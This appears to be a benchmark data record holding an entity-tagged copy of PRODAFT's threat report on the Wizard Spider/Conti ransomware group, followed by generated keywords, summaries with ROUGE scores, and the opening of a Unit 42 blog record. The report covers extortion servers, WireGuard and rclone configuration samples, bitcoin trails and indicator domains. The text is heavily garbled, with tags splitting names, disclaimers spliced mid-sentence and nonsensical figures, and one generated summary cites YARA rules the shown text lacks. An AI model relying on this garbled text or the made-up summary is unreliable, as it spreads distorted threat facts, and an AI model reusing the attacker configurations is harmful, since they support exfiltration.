cold - calling to scare non - responsive victims into paying using a custom [ORG] VoIP system.[4 ] The internal conversation ( as shown in Figure [CARDINAL] 15 ) between the threat actors obtained from the [ORG] ContiLeaks shows the features of the cold - calling systems . Figure [CARDINAL] 15 . Internal conversation between the threat actors on the cold - calling system . The PTI team successfully detected and analyzed the cold - calling system developed by the threat actors ( as shown in Figure [CARDINAL] 16 ) . This system is used to store reports of calls , helping various sub - teams coordinate when pressuring victims further . Types of information regarding each call are ; [CARDINAL] 1 . The unique victim name set by threat actors . [CARDINAL] 2 . Timestamp of the ransomware attack . [CARDINAL] 3 . The group ID of the user responsible . [CARDINAL] 4 . Called status shows \u201d [CARDINAL] 1 \u201d for successful calls and \u201d 0 \u201d for unsuccessful ones or calls not yetmade . [ORG] Internal [ORG] ID ( locked_id ) used by [ORG] Conti threat actors to track victims.5.Figure [CARDINAL] 16 . Custom cold - calling system of the [PERSON] Wizard [PERSON] Spider . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.17 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case [PERSON] Report3.2.5 [PERSON] Daily [PERSON] Cobalt Strikes BeaconsThreat actors generate [PERSON] Cobalt [PERSON] Strike beacons for each team on a daily bases as shown in Figure [CARDINAL] 17 . PTI team has been proactively monitoring all Cobalt Strike samples and notifying the clients to prevent further ransomware attacks . They use different servers and domain names for each sample to avoid detection . However , most samples connect to servers ( some of them are listed in [LAW] Section [LAW] 6 ) residing in ReliableSite data center . Figure [CARDINAL] 17 . Team formations and daily generated Cobalt Strike beacons . The public ContiLeaks provided insight into the intrusion team \u2019s team structure and enriched our findings . For instance , Figure [CARDINAL] 18 shows the team leaders and work - specific details . We think that our findings and public leaks will shed light on the inner structures of the [PERSON] Wizard [PERSON] Spider team . Figure [CARDINAL] 18 . Team leaders and work - specific details ( source : ContiLeaks).DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.18 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case [PERSON] Report3.3 [PERSON] Extortion [PERSON] ServersThe victim \u2019s stolen data is typically transferred to an extortion server ( using rclone or similar data transfer tool ) via a proxy network established using [ORG] Wireguard VPN before deploying the ransomware . We detected several storage servers containing the victim \u2019s data during the PTI team \u2019s investigation . Interestingly , we identified several folders belonging to the victims who agreed to pay the ransom . This finding is an excellent example that we should not trust ransomware operators . Table [CARDINAL] 6 shows the excerpt list of the storage servers . Type [GPE] France [GPE] France [GPE] United [GPE] States [GPE] RELIABLESITE [GPE] United [GPE] States [GPE] RELIABLESITE [GPE] Russia a considerable disk size ( ~26 TB ) . [CARDINAL] One of the most striking findings is that some of the victims in the backup storage were attacked by the [ORG] REvil ransomware gang around Q1/2021 . It presents a worrying example of the collaboration between the ransomware gangs . However , we do not have any further information to confirm whether the [PERSON] Wizard [PERSON] Spider team carried out these attacks or the stolen data transferred from [ORG] REvil \u2019s servers into backup storage.3.3.2 [PERSON] Proxy NetworkThe PTI team determined that threat actors manage victim extortion processes and file transfers through a proxy network using WebDAV service , as some of the parts of them are shown in [LAW] Table [LAW] 7.WebDAV Username [ORG] IP [ORG] Host Europe GmbH [ORG] OVH SASCountry [ORG] Netherlands G [ORG] - Core [ORG] Labs [ORG] Netherlands G [ORG] - Core [ORG] Labs [ORG] Netherlands G [ORG] - Core [ORG] LabsTable 7 . Some of the proxy servers used for transferring the victim \u2019s stolen data . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.19 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case [PERSON] Report3.3.3 VPN InfrastructureIt appears [PERSON] Wizard [PERSON] Spider manages all internal and external traffic through extensive [ORG] Wireguard configurations and [ORG] VPN connections . They even provide access to newly added extortion servers through [ORG] Wireguard instead of accessing them externally . The below lines show the sample [ORG] Wireguard config file.[Interface ] [ORG] ListenPort = [DATE] 51871 [ORG] PrivateKey = < redacted>[Peer ] [ORG] PublicKey = < redacted > PersistentKeepalive = [CARDINAL] 25Console [CARDINAL] 1 . Sample Wireguard config file . The team uses a publicly available Croc tool to transfer the [ORG] FTP or [ORG] VPN configuration files apart from the private keys . They attempt to hide their traces by setting a relay server at the running on different ports ( 9009 , 9010 , 9011 , [DATE] 9012 , and [DATE] 9013 ) . The PTI team observed threat actors regularly transferring configuration files for operational needs . Some of the observed obtained several [ORG] PST files from the [PERSON] Wizard [PERSON] Spider \u2019s extortion servers . The [ORG] PST files contained email information used in phishing campaigns and critical file detection tasks . The QBot panel occasionally parses these [ORG] PST files obtained from victims , including victims who have paid the ransom , to send targeted spam emails . The resulting files are added directly to this database and transferred to remote servers via FTP.DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.20 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case [PERSON] Report3.4 De [PERSON] - AnonymizationOne of the main objectives of our investigation was to reveal the identity of [PERSON] Wizard [PERSON] Spider affiliates , retailers , developers , and servers . Our infrastructure analysis revealed a great deal of exclusive , never - before - seen information regarding the group and its technical infrastructure , in addition to the following information : beacons , executable files , exploits , and custom toolkits.\u2022 Highly - secret credentials / documents for [CARDINAL] at [CARDINAL] least 30 + victims . \u2022 [CARDINAL] 400 + different binaries including [ORG] BazarLoader , [PERSON] Qbot , [ORG] PowerShell scripts , [PERSON] Cobalt [PERSON] Strike [PERSON] \u2022 [PERSON] VPN and file transfer tool \u2019s configurations files . \u2022 [CARDINAL] 750 + victim \u2019s kerberos tickets , domain admin passwords , hashes , etc . \u2022 Anonymous credentials used for operational needs . \u2022 [CARDINAL] 5 bitcoin addresses likely owned by a threat actor who plays a role processing victimpayments . The PTI team observed that one of the threat actors ( prince ) intended to use following bitcoin addresses . Our investigation revealed that some of these bitcoin addresses are used in [GPE] VerifiedForum ( elite underground forum ) , [ORG] HydraMarket ( darknet market ) , [ORG] LuxSocks ( anonymous proxyprovider ) , and several exchange services like Cryptex , WikiExchange , Binance , [ORG] Bizlato , and [ORG] ChangeHero . Address 0.24/0 5.04/0.0007 0.11/0.047 0.001/0 0.002/0Although this particular threat actor uses [ORG] Rclone , [ORG] Rsync , and Mega configurations in encrypted zip files , the PTI team successfully obtained access to all of these files . [CARDINAL] One of the credentials that correspond to the Mega accounts detected on the intrusion server are listed below : [ remote ] type = mega user = vueidutt@sharklasers.com pass = < redacted > Console 2 . Example Rclone config used for accessing Mega . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.21 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case ReportThe threat actors keep all anonymous operational accounts in an [PRODUCT] Excel table and use advanced OPSEC tactics like creating an anonymous identity for each account and logging into accounts only from specific [ORG] IP addresses with auto - generated [ORG] PII data . Figure [CARDINAL] 19 shows the sample operational credentials of the threat actors . Figure [CARDINAL] 19 . Generated operational credentials found in intrusion server . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.22 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case Report3.5 Author Profiling and [ORG] Linguistic [ORG] EvidenceDeep sensors planted by the PTI team can capture , interrupt , and react to information traffic between the cybercriminals in secret and public communication channels . We accumulate linguistic evidence to strengthen our criminal profiling capabilities as part of our cyber attribution efforts . AUCH ( Autorenprofile f\u00fcr die [ORG] Untersuchung [ORG] von [ORG] Cyberkriminalit\u00e4t [ORG] CH ) is our recently developed deep neural networks empowered author profiling technology . AUCH can analyze the language of cybercriminals to reveal important information regarding their identities . It operates based on data and cyber - insight we have acquired over [DATE] the [DATE] years with our unparalleled proactive approach against cybercrime . Our initial report [CARDINAL] 1 on the [ORG] Conti cybercrime group covered the possible connections to [ORG] the [ORG] Russian [ORG] Federation and the [NORP] Russian language , and we have extended our earlier analysis in this report and reinforced our attribution . Figure [CARDINAL] 20 . Conti ransomware team statement from their website.1 . url : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.23 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case [ORG] ReportThe individuals behind the [PERSON] Conti group are known to be well - trained and well - resourced , and they seem to have a certain level of proficiency in the [LANGUAGE] English language . However , [PERSON] AUCH was able to identify various linguistic cues to reveal the native language of the author based on the acquired messages . Our inference engine recognized the suspected connections and concluded that a native [NORP] Russian speaker wrote the statements . AUCH exploits the recent developments in XAI ( Explainable artificial intelligence ) to generate human - friendly explanations on the gradient and attention level to provide our threat intelligence analysts with the necessary information to work towards robust cyber - attribution . [ [CARDINAL] 2 , 1 ] We will be limiting our argumentation with [CARDINAL] three different meaningful examples generated by AUCH to show how our system captures different linguistic relationships.3.5.1 SyntaxConti Statement : As a response to Western warmongering and [NORP] American threats to use cyber warfare against the citizens of ( missing : the ) Russian Federation . The profiler identified the misuse of \u201d determiners \u201d in the [NORP] English statements published by [PERSON] Conti and seemed to put it to use to narrow down the list of potential languages . The final prediction of our system , the [NORP] Russian language , is known to be lacking the use of determiners . The inconsistent use of determiners is a well - known mistake amongst [PERSON] English [PERSON] L2 speakers.3.5.2 GrammaticalityConti Statement : We will use our resources in order to strike back if the well - being and safety of peaceful citizens ( will ) be at stake due to [NORP] American cyber aggression . The profiler points out the faulty tense sequence in the dependent clause of the conditional sentence.3.5.3 [ORG] Choice [ORG] of [ORG] VocabularyConti [ORG] Statement [ORG] : Therefore , it did not publish in free access . In this example , the inference engine pays special attention to the phrases \u201d did not publish \u201d and \u201d free access . \u201d It seems to be the leading cue for our final inference of the [NORP] Russian language . This situation can be explained by the literal translation of the [NORP] Russian sentence ( \u0432 \u0441\u0432\u043e\u0431\u043e\u0434\u043d\u043e\u043c \u0434\u043e\u0441\u0442\u0443\u043f\u0435 . ) . On the other hand , a native speaker of [LANGUAGE] English would probably prefer the sentence \u201d It was not published freely / publicly / in the public domain . \u201dAUCH is currently a preliminary stage research project supported by [ORG] the [ORG] Swiss [ORG] Innovation [ORG] Agency , [ORG] Innosuisse . We collaborate with our partners at [ORG] the [ORG] University [ORG] of [ORG] Zurich to integrate cutting - edge linguistics research into cybersecurity . In [DATE] the [DATE] upcoming [DATE] months , we will be able to showcase more features we work on to support our investigations and consolidate our scientific approach against cybercrime . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.24 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case [PERSON] Report4 [PERSON] Statistics and [ORG] ObservationsThe PTI team correlated victim details obtained from multiple affiliate accounts and servers to determine that the [PERSON] Wizard [PERSON] Spider group has successfully infected [CARDINAL] thousands of devices around the world . Almost all of the group \u2019s targets are enterprise - level corporations . We were able to use this data to glean insight into some of the behavioral patterns , workflows , and activity timelines characteristic of [PERSON] Wizard [PERSON] Spider threat actors.4.1 [PERSON] Victim [PERSON] StatisticsWizard [PERSON] Spider uses a cluster of SystemBC servers to control [CARDINAL] thousands of client devices around the world.[6 ] If a victim appears to be a valuable target , threat actors will deploy [PERSON] Cobalt [PERSON] Strike or similar software to escalate privileges and move laterally through the network . The PTI team identified [CARDINAL] more [CARDINAL] than [CARDINAL] 128036 SystemBC victims in total . The SystemBC victim data shows [PERSON] Wizard [PERSON] Spider threat actors mostly targeted [GPE] Russia 20.5 % and [GPE] the [GPE] United [GPE] States 12.9 % . Although it is seen that threat actors statistically identify victims originating from [GPE] Russia at a high rate , none of them are encountered in [ORG] the [ORG] Cracking [ORG] or [ORG] Encryption stages of the attack cycle . All details regarding victim origins are shown in Figure 21.Figure [CARDINAL] 21 . SystemBC victim distribution by country ( Total Victim : [CARDINAL] 128036).While these [CARDINAL] two countries are by far the most popular targets , it \u2019s worth pointing out that other major economies like [GPE] China , [GPE] India , and [GPE] Brazil are also well represented . [PERSON] Wizard [PERSON] Spider has a significant presence in almost every developed country in the world , and many emerging economies as well . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.25 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case ReportSystemBC data also indicated when [PERSON] Wizard [PERSON] Spider threat actors were most active . While there is activity stretching back to [DATE] the [DATE] end [DATE] of [DATE] 2021 , it mostly represents small - scale attacks . These could be experiments designed to test and fine - tune various aspects of [PERSON] Wizard [PERSON] Spider \u2019s operation , because full - scale attacks targeting [CARDINAL] thousands of users at a time began shortly thereafter , in [DATE] late [DATE] January and [DATE] early [DATE] February . After a short pause , a major initiative took place at [DATE] the [DATE] end [DATE] of [DATE] February , resulting in [CARDINAL] tens [CARDINAL] of [CARDINAL] thousands of new victims by [DATE] early [DATE] March . Figure [CARDINAL] 22 depicts the [DATE] monthly victim statistics . Figure [CARDINAL] 22 . [DATE] Monthly SystemBC victim statistics of [PERSON] Wizard [PERSON] Spider . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal [LAW] authorities.26 [LAW] / [LAW] 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case Report4.2 Cracking Station ActivityWizard Spider operates its own separate cracking station and makes it available to affiliates and users , possibly for a price . The PTI team was able to track cracking station activity timelines and generate a chart showing peak usage hours . Interestingly , it looks like relatively few threat actors made use of [PERSON] Wizard [PERSON] Spider \u2019s specialty cracking tool . There is a slight increase in users logging on [DATE] weekday afternoons , but not enough to indicate regular , sustained use . It \u2019s also likely that users did not have to remain logged into the cracking station long when using it , making overall activity look scarce . Figure [CARDINAL] 23 . Activity graph of cracking station . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.27 / 35TLP : WHITE5 ConclusionWizard Spider Case ReportOur investigation into [PERSON] Wizard [PERSON] Spider had yielded valuable new information about how the group works , what tools it uses , and how its members distribute tasks between themselves . These insights will help cybersecurity professionals and enterprise executives make better risk management decisions . New indicators of compromise will give threat intelligence operatives better visibility into [PERSON] Wizard [PERSON] Spider attack patterns , improving operational security across the board . It \u2019s difficult to overestimate the impact of publishing these findings on a group as large and well - funded as [PERSON] Wizard [PERSON] Spider . With [CARDINAL] hundreds [CARDINAL] of [CARDINAL] thousands of devices infected and a highly distributed professional workflow , even the most conservative estimates indicate [PERSON] Wizard [PERSON] Spider commands [MONEY] hundreds [MONEY] of [MONEY] millions [MONEY] of [MONEY] dollars in assets . The [PERSON] Wizard [PERSON] Spider team has shown itself capable of monetizing multiple aspects of its operations . It is responsible for an enormous quantity of spam on [MONEY] hundreds [MONEY] of [MONEY] millions [MONEY] of [MONEY] millions of devices , as well as concentrated data breaches and ransomware attacks on high - value targets . We \u2019ve quantified the scale of each attack stage in Figure 2.The PRODAFT Threat Intelligence team continues to research [PERSON] Wizard [PERSON] Spider \u2019s capabilities and infrastructure to identify new and better defenses against its attacks . Security professionals and enterprise IT leaders can use this data to catch early indicators of compromise that correspond to [PERSON] Wizard [PERSON] Spider operations and the tactics of the various sub - teams it works with , including the [PERSON] Conti ransomware group . DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.28 / 35TLP : WHITEWizard [PERSON] Spider [PERSON] Case [PERSON] ReportAcknowledgement We would like to thank our advisors for their valuable guidance and support throughout this research . The public version of the report will be shared from our github page [CARDINAL] 2 . The readers can find new samples , IOCs , and new versions of this report from our github page as we will constantly update our page based on new findings.2 . url : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law [ORG] No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report cupertinosmile.com be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law [ORG] No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report samanudi.comDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.32 / 35Wizard [PERSON] Spider [PERSON] Case ReportTLP : [ORG] WHITEsawamini.com [ORG] zupijaz.comDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.33 / 35TLP : WHITER\u00e9f\u00e9rencesWizard [PERSON] Spider [PERSON] Case Report[1 ] [PERSON] Avanti [PERSON] Shrikumar , [PERSON] Peyton [PERSON] Greenside et [PERSON] Anshul [PERSON] Kundaje . \u00ab Learning important features through propagating activation differences \u00bb . In : International conference on machine learning . PMLR . [DATE] 2017 , p. 3145 [CARDINAL] - 3153.[2 ] Mukund Sundararajan , [PERSON] Ankur [PERSON] Taly et [PERSON] Qiqi [PERSON] Yan . \u00ab Axiomatic attribution for deep networks \u00bb .In : International conference on machine learning . PMLR . [DATE] 2017 , p. [CARDINAL] 3319 - 3328.[3 ] [ORG] Advintel . WizardSpider \u2019s [ORG] Log4j [ORG] Exploitation . url : https : / / www . advintel . io / post / ransomware - advisory - log4shell - exploitation - for - initial - access - lateral - movement . ( accessed : [CARDINAL] 29.12.2021).[4 ] CISA . [PERSON] Conti [PERSON] Ransomware . url : url : [CARDINAL] 29.12.2021).[5 ] RiskIQ . WizardSpider \u2019s Ransomware Infrastructure and Windows Zero - Day Exploits . url : url ( accessed : [CARDINAL] 29.12.2021).[6 ] Sophos . WizardSpider SystemBC [PERSON] SOCKS5 [PERSON] Proxy [PERSON] Usage . url : url ( accessed : 29.12.2021).DISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.34 / 35TLP : WHITEHistoriqueWizard [PERSON] Spider [PERSON] Case [PERSON] ReportVersion [PERSON] Date 1.4Auteur(s ) PTI Team 18.03.2022 18.03.2022 PTI Team [CARDINAL] 20.03.2022 PTI Team 21.03.2022 18.05.2022Modifications Initial TLP : RED DRAFT release [ORG] Updated [ORG] - [ORG] Executive [ORG] Summary [ORG] & [ORG] Conclusion [ORG] Updated [ORG] - [ORG] Analysis [ORG] Additional time requested TLPWHITE ReleaseDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of [GPE] PRODAFT and shall be subjected to articles and provisions that have been stipulated in [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation [ORG] and [ORG] Personal [ORG] Data [ORG] Protection [ORG] Law No . 6698 . It shall be noted that [ORG] PRODAFT provides this information \u201c as is \u201d according to its findings , without providing any legally applicable warranty regarding completeness or accuracy of the contents . Therefore , neither this report nor any of its contents can be used as admissible proof before legal authorities.35 / [CARDINAL] 35", "generated_text": "PDF; the report; ProDAFT; Wizard Spider; Conti Ransomware; Threat Intelligence; the group; guidance; infrastructure; sophistication; techniques; techniques; procedures; Detection; exploitation; C&C Panel; victims; indicators; compromise; indicators; victims; evidence; tactics; techniques; Suspicious Activity; Network; encryption; exfiltration; proxy; files; The report; analysis; Windows; threat intelligence; YARA rules; use; CERTS/CSIRTS; users; SIG; sensitive information; the report; information; threat actors; APTs.", "ref_text": "<START-1>The document provides an in-depth analysis of the Wizard Spider cybercrime group, which is behind malware like Ryuk, Trickbot, and Conti ransomware. Wizard Spider has been active since 2017 and may have assets in the hundreds of millions of dollars. The analysis covers Wizard Spider's attack infrastructure including an encryption server for deploying ransomware on hypervisors, intrusion servers for initial access, a password cracking system, and extortion servers for stolen data. It outlines the malware and tools used at each stage of an attack. Victim statistics show Wizard Spider heavily targets organizations in Russia and the US but has a global reach. Activity timelines indicate campaigns ramped up in early 2022 with tens of thousands of victims. Linguistic analysis of statements links Wizard Spider to Russian speakers. The group takes measures to remain anonymous but the report found identifying information on operators. The analysis provides unprecedented visibility into Wizard Spider's inner structure and capabilities. It can help inform defenses against sophisticated, coordinated attacks that leverage distributed teams and custom tools. Indicators of compromise will improve threat intelligence efforts against this high-profit cybercrime group. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.42948717948717946, "gpt3/lexical/rouge_rouge2": 0.0967741935483871, "gpt3/lexical/rouge_rougeL": 0.2051282051282051, "gpt3/lexical/rouge_rougeLsum": 0.2051282051282051, "gpt3_generated_text": ["This report by the PRODAFT Threat Intelligence (PTI) Team provides a comprehensive investigation into the Wizard Spider cybercrime group, also known for using malware variants such as Conti Ransomware. The report offers unprecedented visibility into the group's operational infrastructure, tactics, and techniques. It includes guidance on detection and exploitation techniques, as well as indicators of compromise for victims. The report also covers evidence of suspicious activity, network encryption, and exfiltration of sensitive information through proxy networks. Additionally, it provides YARA rules for detection and analysis of Windows-based threats. The report is being distributed to law enforcement agencies, CERTS/CSIRTS, and users of the U.S.T.A. Threat Intel Platform to aid in the global fight against high-end threat actors and APTs."]}, {"split_name": "test", "sample_id": "test_66", "prompt_text": "Extract the keywords: [PERSON] Blog [PERSON] Home ( url > Unit 42 ( url [ORG] > [ORG] Targeted [ORG] Attacks in [LOC] the [LOC] Middle [LOC] East [LOC] Using [LOC] KASPERAGENT and [ORG] MICROPSIATargeted [ORG] Attacks in [LOC] the [LOC] Middle [LOC] East [LOC] Using [LOC] KASPERAGENT and MICROPSIABy [PERSON] Tomer [PERSON] Bar ( url and [PERSON] Tom [PERSON] Lancaster ( url [DATE] April [DATE] 5 , [DATE] 2017 at [TIME] 5:00 [TIME] AM [TIME] Category : Unit 42 ( url Tags : Android ( url [ORG] ClearSky ( url Google ( url [PERSON] KASPERAGENT ( url malware ( url [PERSON] MICROPSIA ( url [ORG] Microsoft [PRODUCT] Windows ( url [LOC] Middle [LOC] East ( url mobile ( url mobile network operators ( url [ORG] SECUREUPDATE ( url [PERSON] VAMP ( url \ue800 [CARDINAL] 18,376 \ue802(7)(url micropsia%2F+Targeted+Attacks+in+the+Middle+East+Using+KASPERAGENT+and+MICROPSIA ) \ue805 ( url u = [GPE] https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2017%2F04%2Funit42 - targeted - attacks - middle - east - using- kasperagent - micropsia%2F ) [PERSON] \ue804 ( url mini = true&url = [GPE] https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2017%2F04%2Funit42 - targeted - attacks- middle - east - using - kasperagent- micropsia%2F&title = Targeted+Attacks+in+the+Middle+East+Using+KASPERAGENT+and+MICROPSIA&summary=&source=)(//www.reddit.com / submit)This blog is the result of joint research between Unit 42 and Eyal Sela [ORG] ClearSky [ORG] Cyber [ORG] Security ( url Over [DATE] the [DATE] past [DATE] few [DATE] months [GPE] Palo [GPE] Alto [GPE] Networks have been working together with [ORG] ClearSky on preventing and detecting targeted attacks in [LOC] the [LOC] Middle [LOC] East using [CARDINAL] two relatively new [ORG] Microsoft [PRODUCT] Windows malware families which we call [PERSON] KASPERAGENT and [PERSON] MICROPSIA . In addition , our research has uncovered evidence of links between attacks using these [CARDINAL] two new malware families and [CARDINAL] two families of [PRODUCT] Google [PRODUCT] Android malware we are calling SECUREUPDATE and [PERSON] VAMP . We named the \ufb01rst new [ORG] Microsoft [PRODUCT] Windows malware family \u201c [PERSON] KASPERAGENT \u201d based on strings we found in the malware . ( Note that we DO NOT believe this is a reference to [PERSON] Kaspersky [PERSON] Lab ) . We named the [ORDINAL] second new [ORG] Microsoft [PRODUCT] Windows malware family MICROPSIA because the malware is very tightly packed making it appear smaller than it is , similar to the human condition micropsia ( url We named the \ufb01rst new [PRODUCT] Google [PRODUCT] Android malware family SECUREUPDATE because it masks its malicious updates a secure updates . We named the [ORDINAL] second new [PRODUCT] Google [PRODUCT] Android malware family VAMP because it \u2019s focused on stealing data . The 